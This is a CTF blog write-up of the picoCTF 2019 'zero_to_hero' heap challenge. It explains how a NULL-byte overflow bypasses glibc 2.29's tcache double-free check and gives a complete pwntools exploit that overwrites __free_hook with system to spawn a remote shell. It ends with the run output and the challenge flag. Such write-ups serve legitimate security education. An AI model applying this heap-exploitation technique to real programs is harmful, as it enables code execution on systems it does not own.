---
layout: post
title:  "picoCTF 2019: zero_to_hero (Glibc-2.29 Heap Exploitation)"
date:   2019-10-12 00:00:01 +0800
categories: pwn
tags: picoCTF-2019
---

Disclaimer: I didn't actually participate in picoCTF 2019. `r4j` from JHDiscord sent me the binary for this challenge so I could give it a shot.

This is essentially a tcache poisoning attack using a double free. We just have to bypass the new double free security check introduced in glibc 2.28. Of course, just a double free is not enough to solve it, so the author `poortho` (amazing challenge author by the way) also conveniently put in a single NULL byte overflow vulnerability.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 20-30 is what I would guess. Did not have the challenge unlocked to check.

>Now you're really cooking. Can you pwn [this](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/zero_to_hero) service?. Connect with `nc 2019shell1.picoctf.com 49929`. [libc.so.6](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/libc.so.6) [ld-2.29.so](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/ld-2.29.so)

### Solution

As mentioned above, this is a classic tcache poisoning attack with the added double free security check. We bypass that using the single NULL byte overflow vulnerability.

I had to use `patchelf` to change the linker the binary was using, because otherwise it didn't want to run.

#### Reverse Engineering the binary

The binary is very easy to understand. The following are its characteristics:
```sh
vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ file zero_to_hero
zero_to_hero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cf8bd977ca01d23e9b004a6dc637d6ab7c56e656, stripped

vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ checksec zero_to_hero
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```

It has the following functionality:

1. It begins by asking you if you want to be a hero. Simply typing in any string with 'y' as the first character will work.

2. It will give you the address of `system` from libc, so no leak is required.

3. It lets you `add` superpowers. You can give each superpower a description that has a size <= 0x408 (so only tcache size). You can allocate max of 7 chunks, and you cannot change this limit no matter what. Therefore we are completely restricted to tcache chunks.

4. Each chunk is stored in a global array, and when you `free` a chunk, its pointer in that array is not nulled out. Therefore, we can do double frees on these chunks.

This challenge is actually really simple, but it requires some background knowledge about how the tcache works and how the mitigation that was introduced in glibc-2.28 works as well.

For an introduction on how the tcache works, I would suggest reading my writeup of [Ghost_Diary](/2019-10-12-picoctf-2019-ghostdiary/) from picoCTF 2019. I will only talk about the new mitigations here.

#### Tcache double free mitigation post glibc-2.28

Before glibc-2.28, you could double free tcache chunks as many times as you'd want so long as the corresponding tcache bin didn't fill up to its max limit of 7. This starting becoming such a huge problem, that a mitigation was added in glibc-2.28, as follows:
```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key; // essentially the bk pointer
} tcache_entry;
```

Since the `bk` pointer isn't actually used in the tcache, a `key` attribute was added to the `tcache_entry` struct, whose primary reason for existence was to detect double frees. How does it work?

In order to understand we, we must look at the code for the `tcache_get` and `tcache_put` functions
```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache; // [1]

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

Essentially, whenever we free a tcache chunk, `tcache_put` will be called, and the chunk's `bk` field will be set to the address of the `tcache_perthread_struct` on the heap. [1]

Likewise, whenever we get a tcache chunk out of a tcache bin, `tcache_get` will be called which will null out this `bk` field.

As the comment says, the chunk is marked as "in the tcache" so that `_int_free` can make sure the chunk isn't being double freed. The check in `_int_free` is as follows:
```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */

  ...

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache)) // [2]
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)                      // [3]
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
  ...
```

At [2], we see that it first checks to see whether the tcache chunk's `key` field (again, essentially its `bk` pointer) is equal to the address of the `tcache_perthread_struct` on the heap. If it is, then it starts going through this tcache chunk's corresponding tcache bin.

If it finds this chunk already in that tcache bin, then it will error out and call `malloc_printerr` and output `free(): double free detected in tcache 2`.

Therefore we have the following condition: if the chunk we are freeing has its `bk` pointer field set to the address of the tcache bin ***AND*** it is also in its corresponding tcache bin, then we have a double free occurring.

Knowing all this, we can double free in the following two ways:

1. Free the chunk, then use a UAF to overwrite `chunk->key` to any other value, and we will be able to free it again.

2. Free the chunk into one tcache bin, then change its size. You can immediately free it again and put it into a different tcache bin. You can then get the chunk back from the old tcache bin (prior to its size change), and then free the chunk you just got back again. Now the new (second) tcache bin will have a double freed chunk in it.

For this challenge, we utilize the single NULL byte overflow to do it the second way.

#### Exploitation steps

First, as usual, we create our helper functions as follows:
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './zero_to_hero'
HOST, PORT = '2019shell1.picoctf.com', 49929

elf = ELF(BINARY)
libc = ELF('./libc-2.29.so')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(answer):
    p.recv()
    p.send(answer)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])
```

Now, we do the following steps in order using our knowledge of how the new mitigation works.

First, we answer the initial question with a 'y'. We then use the leaked address of `system` to calculate the libc base address and subsequently the address of `__free_hook`:
```python
initialize('y')

# Calculate everything
p.recvuntil(': ')
system = int(p.recvuntil('\n').strip('\n'), 16)
libc.address = system - libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
```

Next we need to add two chunks. The first chunk's size doesn't matter, I arbitrarily choose 0x58 (chunk 0). The second chunk though has to be a size >= 0x110. I arbitrarily chose 0x180 (chunk 1).

We will free chunk 0, then chunk 1. Chunk 0 will go into the 0x50 tcache bin, while chunk 1 will go into the 0x180 tcache bin. I then get back chunk 0, and use the single NULL byte overflow to overwrite chunk 1's size from 0x191 to 0x100. I also set the first 8 bytes of chunk 0 to `'/bin/sh\x00'` for later use.

Since chunk 1's size changed from 0x191 to 0x100, we can immediately free it again. This time, it will go into the 0xf0 tcache bin.
```python
# Add a 0x50 and 0x180 chunk
add(0x58, 'A'*0x58) # Chunk A
add(0x180, 'B'*0x180) # Chunk B

# Free them both
free(0) # Goes into 0x50 tcache bin
free(1) # Goes into 0x180 tcache bin

# Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
add(0x58, '/bin/sh\x00' + 'A'*0x50) # Chunk A

# The 0x180 chunk's size is now actually 0x100 (due to null byte overflow), so we can free it again
free(1) # Goes into 0xf0 tcache bin
```

Remember the chunk that went into the 0x180 tcache bin? It is the same chunk, only now its size is actually 0x100. We reallocate it back out of the 0x180 tcache bin, and immediately free it. What happens now is that the same chunk is in the 0xf0 tcache bin twice, as if we had double freed it.
```python
# Get back the 0x100 chunk out of the 0x180 tcache bin
add(0x180, 'C'*0x180) # Chunk B

# Since tcache_get will null out the key, we can free it immediately
free(3) # Goes into 0xf0 tcache bin

# Now: tcache[0x100] -> Chunk B <- Chunk B
```

After that, it's the usual tcache poisoning attack to get a chunk on `__free_hook` and overwrite it with the address to `system`:
```python
# We do the usual tcache poisoning attack

# Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
add(0xf0, p64(free_hook) + 'D'*0xe8)

# Allocates chunk B again
add(0xf0, 'E'*0xf0)

# Allocates chunk on __free_hook, change it to system
add(0xf0, p64(system) + 'F'*0xe8)
```

Now, remember when we changed chunk 0's first 8 bytes to `'/bin/sh\x00'`? If we call `free(0)`, it will actually call `free(ptr_to_chunk_0)`, which means it will now also call `((*)__free_hook)(ptr_to_chunk_0, ...)`.

Since we changed `__free_hook` to point to `system`, it will actually call `system(ptr_to_chunk_0)`, and if you imagine `ptr_to_chunk_0` to be a `char *`, it will call `system("/bin/sh\x00")`, giving us a shell:
```python
# Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
free(0)

p.interactive()
```

And so we use exactly 7 chunks to do the exploit. Perfect limit.

### Final exploit:

```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './zero_to_hero'
HOST, PORT = '2019shell1.picoctf.com', 49929

elf = ELF(BINARY)
libc = ELF('./libc-2.29.so')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(answer):
    p.recv()
    p.send(answer)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

initialize('y')

# Calculate everything
p.recvuntil(': ')
system = int(p.recvuntil('\n').strip('\n'), 16)
libc.address = system - libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

# Add a 0x50 and 0x180 chunk
add(0x58, 'A'*0x58) # Chunk A
add(0x180, 'B'*0x180) # Chunk B

# Free them both
free(0) # Goes into 0x50 tcache bin
free(1) # Goes into 0x180 tcache bin

# Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
add(0x58, '/bin/sh\x00' + 'A'*0x50) # Chunk A

# The 0x180 chunk's size is now actually 0x100 (due to null byte overflow), so we can free it again
free(1) # Goes into 0xf0 tcache bin

# Get back the 0x100 chunk out of the 0x180 tcache bin
add(0x180, 'C'*0x180) # Chunk B

# But remember that it's size is still 0x100, so we can free it immediately
free(3) # Goes into 0xf0 tcache bin

# Now: tcache[0x100] -> Chunk B <- Chunk B
# We do the usual tcache poisoning attack

# Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
add(0xf0, p64(free_hook) + 'D'*0xe8)

# Allocates chunk B again
add(0xf0, 'E'*0xf0)

# Allocates chunk on __free_hook, change it to system
add(0xf0, p64(system) + 'F'*0xe8)

# Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
free(0)

p.interactive()
```
```sh
vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/libc-2.29.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 49929: Done
[*] Libc base: 0x7f0d11c61000
[*] system: 0x7f0d11cb3fd0
[*] __free_hook: 0x7f0d11e485a8
[*] Switching to interactive mode
$ ls
flag.txt
ld-2.29.so
libc.so.6
xinet_startup.sh
zero_to_hero
$ cat flag.txt
picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_fjqlovui}
```
